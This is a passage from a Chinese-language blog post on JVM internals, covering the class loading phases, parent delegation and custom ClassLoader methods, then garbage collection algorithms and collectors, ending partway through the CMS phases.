title="验证"></a>验证</h4><p>验证的主要作用就是确保被加载的类的正确性。也是连接阶段的第一步。说白了也就是我们加载好的.class文件不能对我们的虚拟机有危害，所以先检测验证一下。它主要是完成四个阶段的验证：</p><ol><li>文件格式的验证：验证.class文件字节流是否符合class文件的格式的规范，并且能够被当前版本的虚拟机处理。这里面主要对魔数、主版本号、常量池等等的校验（魔数、主版本号都是.class文件里面包含的数据信息、在这里可以不用理解）。</li><li>元数据验证：主要是对字节码描述的信息进行语义分析，以保证其描述的信息符合Java语言规范的要求，比如说验证这个类是不是有父类，类中的字段方法是不是和父类冲突等等。</li><li>字节码验证：这是整个验证过程最复杂的阶段，主要是通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。在元数据验证阶段对数据类型做出验证后，这个阶段主要对类的方法做出分析，保证类的方法在运行时不会做出危害虚拟机安全的事。</li><li>符号引用验证：它是验证的最后一个阶段，发生在虚拟机将符号引用转化为直接引用的时候。主要是对类自身以外的信息进行校验。目的是确保解析动作能够完成。</li></ol><p>对整个类加载机制而言，验证阶段是一个很重要但是非必需的阶段，如果我们的代码能够确保没有问题，那么我们就没有必要去验证，毕竟验证需要花费一定的的时间。当然我们可以使用<code>-Xverfity:none</code>来关闭大部分的验证。</p><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><p><strong>准备阶段主要为类变量分配内存并设置初始值。</strong>这些内存都在方法区分配。在这个阶段我们只需要注意两点就好了，也就是类变量和初始值两个关键词：</p><ol><li>类变量（static）会分配内存，但是实例变量不会，实例变量主要随着对象的实例化一块分配到Java堆中，</li><li>这里的初始值指的是数据类型默认值，而不是代码中被显示赋予的值。比如<code>public static int value = 1;</code> 在这里准备阶段过后的value值为0，而不是1。赋值为1的动作在初始化阶段。当然还有其他的默认值。</li></ol><p><img src="/2020/05/08/浅析JVM/11.png" alt=""></p><p>注意，在上面value是被static所修饰的准备阶段之后是0，但是如果同时被final和static修饰准备阶段之后就是1了。我们可以理解为static final在编译器就将结果放入调用它的类的常量池中了。</p><h4 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h4><p>解析阶段主要是虚拟机将常量池中的符号引用转化为直接引用的过程。什么是符号应用和直接引用呢？</p><ul><li>符号引用：以一组符号来描述所引用的目标，可以是任何形式的字面量，只要是能无歧义的定位到目标就好，就好比在班级中，老师可以用张三来代表你，也可以用你的学号来代表你，但无论任何方式这些都只是一个代号（符号），这个代号指向你（符号引用）</li><li>直接引用：直接引用是可以指向目标的指针、相对偏移量或者是一个能直接或间接定位到目标的句柄。和虚拟机实现的内存有关，不同的虚拟机直接引用一般不同。</li></ul><p>解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。</p><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>这是类加载机制的最后一步，在这个阶段，Java程序代码才开始真正执行。我们知道，在准备阶段已经为类变量赋过一次值。在初始化阶段，程序员可以根据自己的需求来赋值了。一句话描述这个阶段就是执行类构造器<code>&lt; clinit &gt;()</code>方法的过程。</p><p>在初始化阶段，<strong>主要为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。</strong>在Java中对类变量进行初始值设定有两种方式：</p><ol><li>声明类变量是指定初始值</li><li>使用静态代码块为类变量指定初始值</li></ol><p><strong>JVM初始化步骤</strong></p><p>总的来说，初始化顺序依次是：（静态变量、静态初始化块）–&gt;（变量、初始化块）–&gt; 构造器；如果有父类，则顺序是：父类static方法 –&gt; 子类static方法 –&gt; 父类构造方法- -&gt; 子类构造方法</p><ol><li>假如这个类还没有被加载和连接，则程序先加载并连接该类</li><li>假如该类的直接父类还没有被初始化，则先初始化其直接父类</li><li>假如类中有初始化语句，则系统依次执行这些初始化语句</li></ol><p><strong>类初始化时机</strong></p><p>只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种：</p><ul><li>创建类的实例，也就是new的方式</li><li>访问某个类或接口的静态变量，或者对该静态变量赋值</li><li>调用类的静态方法</li><li>反射（如<code>Class.forName(&quot;com.shengsiyuan.Test&quot;)</code>）</li><li>初始化某个类的子类，则其父类也会被初始化</li><li>Java虚拟机启动时被标明为启动类的类（ JavaTest），直接使用java.exe命令来运行某个主类</li></ul><h3 id="类加载器介绍"><a href="#类加载器介绍" class="headerlink" title="类加载器介绍"></a>类加载器介绍</h3><p>类加载器的调用顺序如下：</p><p><img src="/2020/05/08/浅析JVM/12.png" alt=""></p><p>Java默认提供的三个ClassLoader：BootStrap ClassLoader、Extension ClassLoader、App ClassLoader</p><p>加载顺序：Bootstrap ClassLoader &gt; Extention ClassLoader &gt; App ClassLoader</p><h4 id="BootStrap-ClassLoader"><a href="#BootStrap-ClassLoader" class="headerlink" title="BootStrap ClassLoader"></a>BootStrap ClassLoader</h4><p>BootStrap ClassLoader被称为启动类加载器，是Java类加载层次中最顶层的类加载器，负责加载JDK中的核心类库，如：rt.jar、resources.jar、charsets.jar等，可通过如下程序获得该类加载器从哪些地方加载了相关的jar或class文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BootStrapTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      URL[] urls = sun.misc.Launcher.getBootstrapClassPath().getURLs();</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; urls.length; i++) &#123;</span><br><span class="line">          System.out.println(urls[i].toExternalForm());</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码查询结果可以通过查找 sun.boot.class.path 这个系统属性所得知的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(System.getProperty(<span class="string">"sun.boot.class.path"</span>));</span><br></pre></td></tr></table></figure><h4 id="Extension-ClassLoader"><a href="#Extension-ClassLoader" class="headerlink" title="Extension ClassLoader"></a>Extension ClassLoader</h4><p>Extension ClassLoader，扩展类加载器，负责加载Java的扩展类库，Java虚拟机的实现会提供一个扩展库目录。该类加载器在此目录里面查找并加载 Java 类。默认加载JAVA_HOME/jre/lib/ext/目下的所有jar。</p><h4 id="App-ClassLoader"><a href="#App-ClassLoader" class="headerlink" title="App ClassLoader"></a>App ClassLoader</h4><p>App ClassLoader，系统类加载器，负责加载应用程序classpath目录下的所有jar和class文件。一般来说，Java应用的类都是由它来完成加载的。可以通过<code>ClassLoader.getSystemClassLoader()</code>来获取它。</p><h4 id="Tomcat的类加载顺序"><a href="#Tomcat的类加载顺序" class="headerlink" title="Tomcat的类加载顺序"></a>Tomcat的类加载顺序</h4><p>如图：</p><p><img src="/2020/05/08/浅析JVM/13.png" alt=""></p><h3 id="双亲委托策略"><a href="#双亲委托策略" class="headerlink" title="双亲委托策略"></a>双亲委托策略</h3><h4 id="双亲委托策略内容"><a href="#双亲委托策略内容" class="headerlink" title="双亲委托策略内容"></a>双亲委托策略内容</h4><p>ClassLoader使用的是双亲委托模型来搜索类的，每个ClassLoader实例都有一个父类加载器的引用（不是继承的关系，是一个包含的关系），虚拟机内置的类加载器（Bootstrap ClassLoader）本身没有父类加载器，但可以用作其它ClassLoader实例的的父类加载器。</p><p>当一个ClassLoader实例需要加载某个类时，它会试图亲自搜索某个类之前，先把这个任务委托给它的<strong>父类加载器</strong>，这个过程是由上至下依次检查的，首先由最顶层的类加载器Bootstrap ClassLoader试图加载，如果没加载到，则把任务转交给Extension ClassLoader试图加载，如果也没加载到，则转交给App ClassLoader 进行加载，如果它也没有加载得到的话，则返回给委托的发起者，由它到指定的文件系统或网络等URL中加载该类。</p><p>如果它们都没有加载到这个类时，则抛出ClassNotFoundException异常。否则将这个找到的类生成一个类的定义，并将它加载到内存当中，最后返回这个类在内存中的Class实例对象。</p><h4 id="为什么使用双亲委托策略"><a href="#为什么使用双亲委托策略" class="headerlink" title="为什么使用双亲委托策略"></a>为什么使用双亲委托策略</h4><p>因为这样可以避免重复加载，当父亲已经加载了该类的时候，就没有必要子ClassLoader再加载一次。</p><p>考虑到安全因素，我们试想一下，如果不使用这种委托模式，那我们就可以随时使用自定义的String来动态替代Java核心API中定义的类型，这样会存在非常大的安全隐患。</p><p>而双亲委托的方式，就可以避免这种情况，因为String已经在启动时就被引导类加载器（Bootstrcp ClassLoader）加载，所以用户自定义的ClassLoader永远也无法加载一个自己写的String，除非你改变JDK中ClassLoader搜索类的默认算法。</p><h4 id="JVM在搜索类的时候，如何判断两个class相同呢？"><a href="#JVM在搜索类的时候，如何判断两个class相同呢？" class="headerlink" title="JVM在搜索类的时候，如何判断两个class相同呢？"></a>JVM在搜索类的时候，如何判断两个class相同呢？</h4><p><strong>JVM在判定两个class是否相同时，不仅要判断两个类名是否相同，而且要判断是否由同一个类加载器实例加载的。</strong></p><p>只有两者同时满足的情况下，JVM才认为这两个class是相同的。就算两个class是同一份class字节码，如果被两个不同的ClassLoader实例所加载，JVM也会认为它们是两个不同class。</p><p>比如网络上的一个Java类org.classloader.simple.NetClassLoaderSimple，javac编译之后生成字节码文件NetClassLoaderSimple.class，ClassLoaderA和ClassLoaderB这两个类加载器并读取了NetClassLoaderSimple.class文件，并分别定义出了java.lang.Class实例来表示这个类。</p><p>对于JVM来说，它们是两个不同的实例对象，但它们确实是同一份字节码文件，如果试图将这个Class实例生成具体的对象进行转换时，就会抛运行时异常java.lang.ClassCaseException，提示这是两个不同的类型。</p><p>在一个单虚拟机环境下，标识一个类有两个因素：class的全路径名、该类的ClassLoader。</p><p><img src="/2020/05/08/浅析JVM/14.png" alt=""></p><h4 id="不遵循“双亲委托机制”的场景"><a href="#不遵循“双亲委托机制”的场景" class="headerlink" title="不遵循“双亲委托机制”的场景"></a>不遵循“双亲委托机制”的场景</h4><p>上面说了双亲委托机制主要是为了实现不同的ClassLoader之间加载的类的交互问题，被大家公用的类就交由父加载器去加载，但是Java中确实也存在父类加载器加载的类需要用到子加载器加载的类的情况。</p><p>Java中有一个SPI(Service Provider Interface)标准。</p><p>使用了SPI的库，比如JDBC、JNDI等，我们都知道JDBC需要第三方提供的驱动才可以，而驱动的jar包是放在我们应用程序本身的classpath的，而JDBC本身的API是JDK提供的一部分，它已经被bootstrap加载了，那第三方厂商提供的实现类怎么加载呢？</p><p>这里面Java引入了线程上下文类加载的概念，线程类加载器默认会从父线程继承，如果没有指定的话，默认就是系统类加载器（App ClassLoader），这样的话当加载第三方驱动的时候，就可以通过线程的上下文类加载器来加载。</p><p>另外为了实现更灵活的类加载器OSGI以及一些Java app server也打破了双亲委托机制。</p><h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p>看到Java为我们提供了三个类加载器，应用程序都是由这三种类加载器互相配合进行加载的，如果有必要，我们还可以加入自定义的类加载器。</p><h4 id="如何自定义类加载"><a href="#如何自定义类加载" class="headerlink" title="如何自定义类加载"></a>如何自定义类加载</h4><p>以下两个步骤：</p><ul><li>继承java.lang.ClassLoader；</li><li>覆写父类的findClass()方法；</li></ul><h4 id="几个关键的方法"><a href="#几个关键的方法" class="headerlink" title="几个关键的方法"></a>几个关键的方法</h4><h5 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h5><ul><li><code>defineClass(byte[], int, int)</code>：把字节数组b中的内容转换成 Java 类，返回的结果是java.lang.Class类的实例。这个方法被声明为final的；</li><li><code>findClass(String name)</code>：查找名称为name的类，返回的结果是java.lang.Class类的实例；</li><li><code>loadClass(String name)</code>：加载名称为name的类，返回的结果是java.lang.Class类的实例；</li><li><code>resolveClass(Class&lt;?&gt;)</code>：链接指定的 Java 类；</li></ul><h5 id="方法使用"><a href="#方法使用" class="headerlink" title="方法使用"></a>方法使用</h5><p><strong>(1) loadClass()方法</strong></p><p>方法定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name)  <span class="keyword">throws</span> ClassNotFoundException</span><br></pre></td></tr></table></figure><p>方法的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;  </span><br><span class="line">    <span class="keyword">return</span> loadClass(name, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面可以看出loadClass方法调用了<code>loadClass(name, false)</code>方法，那么接下来我们再来看看另外一个loadClass()方法的实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">synchronized</span> Class&lt;?&gt; loadClass(String name, <span class="keyword">boolean</span> resolve)  <span class="keyword">throws</span> ClassNotFoundException   </span><br><span class="line">&#123; <span class="comment">// First, check if the class has already been loaded  Class c = findLoadedClass(name);</span></span><br><span class="line"><span class="comment">//检查class是否已经被加载过了  </span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="keyword">null</span>)&#123;     </span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (parent != <span class="keyword">null</span>)&#123;</span><br><span class="line">                c = parent.loadClass(name, <span class="keyword">false</span>); <span class="comment">//如果没有被加载，且指定了父类加载器，则委托父加载器加载。    </span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                c = findBootstrapClass0(name);<span class="comment">//如果没有父类加载器，则委托bootstrap加载器加载&#125; </span></span><br><span class="line">        &#125;<span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            <span class="comment">// If still not found, then invoke findClass in order          </span></span><br><span class="line">            <span class="comment">// to find the class.         </span></span><br><span class="line">            c = findClass(name);<span class="comment">//如果父类加载没有加载到，则通过自己的findClass来加载。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(resolve)&#123;</span><br><span class="line">        resolveClass(c); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码，通过注释可以清晰看出loadClass()的双亲委托机制是如何工作的。 这里我们需要注意一点就是<code>public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException</code>没有被标记为final，也就<strong>意味着我们是可以override这个方法的，也就是说双亲委托机制是可以打破的</strong>。另外上面注意到有个findClass()方法，接下来我们就来说说这个方法到底是做什么的。</p><p><strong>(2) findClass()方法</strong></p><p>我们查看java.lang.ClassLoader的源代码，我们发现findClass的实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看出此方法默认的实现是直接抛出异常，其实这个方法就是留给我们应用程序来override的。那么具体的实现就看你的实现逻辑了，你可以从磁盘读取，也可以从网络上获取class文件的字节流，获取class二进制了以后就可以交给defineClass来实现进一步的加载。defineClass我们在下面再来描述。</p><p><strong>(3) defineClass方法</strong></p><p>defineClass的代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="keyword">byte</span>[] b, <span class="keyword">int</span> off, <span class="keyword">int</span> len)  <span class="keyword">throws</span> ClassFormatError&#123;     </span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="keyword">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从上面的代码我们看出此方法被定义为了final，这也就意味着此方法不能被Override，其实这也是JVM留给我们的唯一的入口，通过这个唯一的入口，JVM保证了类文件必须符合Java虚拟机规范规定的类的定义。此方法最后会调用native的方法来实现真正的类的加载工作。</p><h2 id="0x05-JVM垃圾回收机制GC"><a href="#0x05-JVM垃圾回收机制GC" class="headerlink" title="0x05 JVM垃圾回收机制GC"></a>0x05 JVM垃圾回收机制GC</h2><h3 id="JVM内存空间介绍"><a href="#JVM内存空间介绍" class="headerlink" title="JVM内存空间介绍"></a>JVM内存空间介绍</h3><p>在前面已经具体介绍过。</p><p>JVM的内存空间，从大的层面上来分析包含：新生代空间（Young）和老年代空间（Old）。新生代空间（Young）又被分为2个部分（Eden区域、Survivous区域）和3个板块（1个Eden区域和2个Survivous区域）。</p><p><img src="/2020/05/08/浅析JVM/15.png" alt=""></p><p>下面来看下具体每部分都是用来干什么的：</p><ul><li><p>Eden(伊甸园)区域：用来存放使用new或者newInstance等方式创建的对象，默认这些对象都是存放在Eden区，除非这个对象太大，或者超出了设定的阈值<code>-XX:PretenureSizeThresold</code>，这样的对象会被直接分配到Old区域。</p></li><li><p>2个Survivous(幸存)区域：一般称为S0、S1，理论上一样大。</p></li></ul><h3 id="针对不同代的垃圾回收机制"><a href="#针对不同代的垃圾回收机制" class="headerlink" title="针对不同代的垃圾回收机制"></a>针对不同代的垃圾回收机制</h3><h4 id="新生代（Young-generation）"><a href="#新生代（Young-generation）" class="headerlink" title="新生代（Young generation）"></a>新生代（Young generation）</h4><p>绝大多数最新被创建的对象都会被分配到这里，由于大部分在创建后很快变得不可达，很多对象被创建在新生代，然后“消失”。对象从这个区域“消失”的过程我们称之为：Minor GC 。</p><h4 id="老年代（Old-generation）"><a href="#老年代（Old-generation）" class="headerlink" title="老年代（Old generation）"></a>老年代（Old generation）</h4><p>对象没有变得不可达，并且从新生代周期中存活了下来，会被拷贝到这里。其区域分配的空间要比新生代多。也正由于其相对大的空间，发生在老年代的GC次数要比新生代少得多。对象从老年代中消失的过程，称之为：Major GC或者Full GC。</p><h4 id="持久代（Permanent-generation）"><a href="#持久代（Permanent-generation）" class="headerlink" title="持久代（Permanent generation）"></a>持久代（Permanent generation）</h4><p>这个区域不是用于存储那些从老年代存活下来的对象，这个区域也可能发生GC。发生在这个区域的GC事件也被算为Major GC。只不过在这个区域发生GC的条件非常严苛，必须符合以下三种条件才会被回收：</p><ul><li>所有实例被回收</li><li>加载该类的ClassLoader被回收</li><li>Class对象无法通过任何途径访问（包括反射）</li></ul><h3 id="第一次GC"><a href="#第一次GC" class="headerlink" title="第一次GC"></a>第一次GC</h3><p>在不断创建对象的过程中，当Eden区域被占满，此时会开始做Young GC也叫Minor GC：</p><ol><li>第一次GC时Survivous中S0区和S1区都为空，将其中一个作为To Survivor(用来存储Eden区域执行GC后不能被回收的对象)。比如：将S0作为To Survivor，则S1为From Survivor。</li><li>将Eden区域经过GC不能被回收的对象存储到To Survivor（S0）区域（此时Eden区域的内存会在垃圾回收的过程中全部释放），但如果To Survivor（S0）被占满了，Eden中剩下不能被回收对象只能存放到Old区域。</li><li>将Eden区域空间清空，此时From Survivous区域（S1）也是空的。</li><li>S0与S1互相切换标签，S0为From Survivor，S1为To Survivor。</li></ol><p><img src="/2020/05/08/浅析JVM/16.png" alt=""></p><h3 id="第二次及之后的GC"><a href="#第二次及之后的GC" class="headerlink" title="第二次及之后的GC"></a>第二次及之后的GC</h3><p>当第二次Eden区域被占满时，此时开始做GC：</p><ol><li>将Eden和From Survivor(S0)中经过GC未被回收的对象迁移到To Survivor(S1)，如果To Survious(S1)区放不下，将剩下的不能回收对象放入Old区域；</li><li>将Eden区域空间和From Survivor（S0）区域空间清空；</li><li>S0与S1互相切换标签，S0为To Survivor，S1为From Survivor。</li></ol><p><img src="/2020/05/08/浅析JVM/17.png" alt=""></p><p>第三、第四次依次类推，始终保证S0和S1有一个空的，用来存储临时对象，用于交换空间的目的。反反复复多次没有被淘汰的对象，将会被放入Old区域中，默认15次（由参数<code>--XX:MaxTenuringThreshold=15</code>决定）。</p><h3 id="垃圾回收算法"><a href="#垃圾回收算法" class="headerlink" title="垃圾回收算法"></a>垃圾回收算法</h3><h4 id="根搜索算法"><a href="#根搜索算法" class="headerlink" title="根搜索算法"></a>根搜索算法</h4><p>根搜索算法是从离散数学中的图论引入的，程序把所有引用关系看作一张图，从一个节点GC ROOT开始，寻找对应的引用节点，找到这个节点后，继续寻找这个节点的引用节点。当所有的引用节点寻找完毕后，剩余的节点则被认为是没有被引用到的节点，即无用的节点。</p><p><img src="/2020/05/08/浅析JVM/18.png" alt=""></p><p>上图红色为无用的节点，可以被回收。</p><p>目前Java中可以作为GC ROOT的对象有：</p><ul><li>虚拟机栈中引用的对象（本地变量表）</li><li>方法区中静态属性引用的对象</li><li>方法区中常量引用的对象</li><li>本地方法栈中引用的对象（Native对象）</li></ul><p>基本所有GC算法都引用根搜索算法这种概念。</p><h4 id="标记-清除算法"><a href="#标记-清除算法" class="headerlink" title="标记-清除算法"></a>标记-清除算法</h4><p>标记-清除算法采用从根集合进行扫描，对存活的对象进行标记，标记完毕后，再扫描整个空间中未被标记的对象进行直接回收。</p><p>标记-清除算法不需要进行对象的移动，并且仅对不存活的对象进行处理，在存活的对象比较多的情况下极为高效，但由于标记-清除算法直接回收不存活的对象，并没有对还存活的对象进行整理，因此会导致内存碎片。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/19.png" alt=""></p><h4 id="复制算法"><a href="#复制算法" class="headerlink" title="复制算法"></a>复制算法</h4><p>复制算法将内存划分为两个区间，使用此算法时，所有动态分配的对象都只能分配在其中一个区间（活动区间），而另外一个区间（空闲区间）则是空闲的。</p><p>复制算法采用从根集合扫描，将存活的对象复制到空闲区间，当扫描完毕活动区间后，会的将活动区间一次性全部回收。此时原本的空闲区间变成了活动区间。下次GC时候又会重复刚才的操作，依次循环。</p><p>复制算法在存活对象比较少的时候，极为高效，但是带来的成本是牺牲一半的内存空间用于进行对象的移动。所以复制算法的使用场景，必须是对象的存活率非常低才行，而且最重要的是，我们需要克服50%内存的浪费。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/20.png" alt=""></p><h4 id="标记-整理算法"><a href="#标记-整理算法" class="headerlink" title="标记-整理算法"></a>标记-整理算法</h4><p>标记-整理算法采用标记-清除算法一样的方式进行对象的标记、清除，但在回收不存活的对象占用的空间后，会将所有存活的对象往左端空闲空间移动，并更新对应的指针。</p><p>标记-整理算法是在标记-清除算法之上，又进行了对象的移动排序整理，因此成本更高，但却解决了内存碎片的问题。</p><p>JVM为了优化内存的回收，使用了分代回收的方式，对于新生代内存的回收（Minor GC）主要采用复制算法。而对于老年代的回收（Major GC），大多采用标记-整理算法。</p><p>如图：</p><p><img src="/2020/05/08/浅析JVM/21.png" alt=""></p><h3 id="垃圾回收器"><a href="#垃圾回收器" class="headerlink" title="垃圾回收器"></a>垃圾回收器</h3><p>新生代收集器：</p><ul><li>Serial（-XX:+UseSerialGC）</li><li>ParNew（-XX:+UseParNewGC）</li><li>ParallelScavenge（-XX:+UseParallelGC）</li><li>G1收集器</li></ul><p>老年代收集器：</p><ul><li>SerialOld（-XX:+UseSerialOldGC）</li><li>ParallelOld（-XX:+UseParallelOldGC）</li><li>CMS（-XX:+UseConcMarkSweepGC）</li><li>G1收集器</li></ul><h4 id="Serial（-XX-UseSerialGC）"><a href="#Serial（-XX-UseSerialGC）" class="headerlink" title="Serial（-XX:+UseSerialGC）"></a>Serial（-XX:+UseSerialGC）</h4><p>从名字我们可以看出，这是一个串行收集器。</p><p>Serial收集器是Java虚拟机中最基本、历史最悠久的收集器。在JDK1.3之前是Java虚拟机新生代收集器的唯一选择。目前也是ClientVM下ServerVM 4核4GB以下机器默认垃圾回收器。Serial收集器并不是只能使用一个CPU进行收集，而是当JVM需要进行垃圾回收的时候，需暂停所有的用户线程，直到回收结束。</p><p>使用算法：复制算法</p><p><img src="/2020/05/08/浅析JVM/22.png" alt=""></p><p>Serial收集器虽然是最老的，但是它对于限定单个CPU的环境来说，由于没有线程交互的开销，专心做垃圾收集，所以它在这种情况下是相对于其他收集器中最高效的。</p><p>JVM中文名称为Java虚拟机，因此它像一台虚拟的电脑在工作，而其中的每一个线程都被认为是JVM的一个处理器，因此图中的CPU0、CPU1实际上为用户的线程，而不是真正的机器CPU，不要误解哦。</p><h4 id="SerialOld（-XX-UseSerialGC）"><a href="#SerialOld（-XX-UseSerialGC）" class="headerlink" title="SerialOld（-XX:+UseSerialGC）"></a>SerialOld（-XX:+UseSerialGC）</h4><p>SerialOld是Serial收集器的老年代收集器版本，它同样是一个单线程收集器，这个收集器目前主要用于Client模式下使用。如果在Server模式下，它主要还有两大用途：一个是在JDK1.5及之前的版本中与Parallel Scavenge收集器搭配使用，另外一个就是作为CMS收集器的后备预案，如果CMS出现Concurrent Mode Failure，则SerialOld将作为后备收集器。</p><p>使用算法：标记-整理算法</p><p>运行示意图与上图一致。</p><h4 id="ParNew（-XX-UseParNewGC）"><a href="#ParNew（-XX-UseParNewGC）" class="headerlink" title="ParNew（-XX:+UseParNewGC）"></a>ParNew（-XX:+UseParNewGC）</h4><p>ParNew收集器其实就是Serial收集器的多线程版本，除了使用多条线程进行垃圾收集之外，其余行为包括Serial收集器可用的所有控制参数、收集算法、Stop The World、对象分配规则、回收策略等都与Serial收集器完全一样，在实现上，这两种收集器也共用了相当多的代码。</p><p>应用场景：ParNew收集器是许多运行在Server模式下的虚拟机中首选的新生代收集器。有一个很重要的原因是除了Serial收集器外，目前只有它能与CMS收集器配合工作。</p><p>使用算法：复制算法</p><p><img src="/2020/05/08/浅析JVM/23.png" alt=""></p><p>ParNew是许多运行在Server模式下的JVM首选的新生代收集器。但是在单CPU的情况下，它的效率远远低于Serial收集器，所以一定要注意使用场景。</p><h4 id="ParallelScavenge（-XX-UseParallelGC）"><a href="#ParallelScavenge（-XX-UseParallelGC）" class="headerlink" title="ParallelScavenge（-XX:+UseParallelGC）"></a>ParallelScavenge（-XX:+UseParallelGC）</h4><p>ParallelScavenge又被称为吞吐量优先收集器，和ParNew 收集器类似，是一个新生代收集器。</p><p>使用算法：复制算法</p><p>ParallelScavenge收集器的目标是达到一个可控件的吞吐量，所谓吞吐量就是CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量 = 运行用户代码时间 / （运行用户代码时间 + 垃圾收集时间）。</p><p>如果虚拟机总共运行了100分钟，其中垃圾收集花了1分钟，那么吞吐量就是99% 。</p><h4 id="ParallelOld（-XX-UseParallelOldGC）"><a href="#ParallelOld（-XX-UseParallelOldGC）" class="headerlink" title="ParallelOld（-XX:+UseParallelOldGC）"></a>ParallelOld（-XX:+UseParallelOldGC）</h4><p>ParallelOld是并行收集器，和SerialOld一样，ParallelOld是一个老年代收集器，是老年代吞吐量优先的一个收集器。</p><p>这个收集器在JDK1.6之后才开始提供的，在此之前，ParallelScavenge只能选择SerialOld来作为其老年代的收集器，这严重拖累了ParallelScavenge整体的速度。而ParallelOld的出现后，“吞吐量优先”收集器才名副其实！</p><p>使用算法：标记-整理算法</p><p><img src="/2020/05/08/浅析JVM/24.png" alt=""></p><p>在注重吞吐量与CPU数量大于1的情况下，都可以优先考虑ParallelScavenge + ParalleloOld收集器。</p><h4 id="CMS-（-XX-UseConcMarkSweepGC）"><a href="#CMS-（-XX-UseConcMarkSweepGC）" class="headerlink" title="CMS （-XX:+UseConcMarkSweepGC）"></a>CMS （-XX:+UseConcMarkSweepGC）</h4><p>CMS是一个老年代收集器，全称 Concurrent Low Pause Collector，是JDK1.4后期开始引用的新GC收集器，在JDK1.5、1.6中得到了进一步的改进。它是对于响应时间的重要性需求大于吞吐量要求的收集器。对于要求服务器响应速度高的情况下，使用CMS非常合适。</p><p>CMS的一大特点，就是用两次短暂的暂停来代替串行或并行标记整理算法时候的长暂停。</p><p>使用算法：标记-清理</p><h5 id="CMS的执行过程"><a href="#CMS的执行过程" class="headerlink" title="CMS的执行过程"></a>CMS的执行过程</h5><p>CMS的执行过程如下：</p><ul><li><p>初始标记（STW initial mark）</p><p>在这个阶段，需要虚拟机停顿正在执行的应用线程，官方的叫法STW（Stop Tow World）。这个过程从根对象扫描直接关联的对象，并作标记。这个过程会很快的完成。</p></li><li><p>并发标记（Concurrent marking）</p><p>这个阶段紧随初始标记阶段，在“初始标记”的基础上继续向下追溯标记。注意这里是并发标记，表示用户线程可以和GC线程一起并发执行，这个阶段不会暂停用户的线程哦。</p></li><li><p>并发预清理（Concurrent 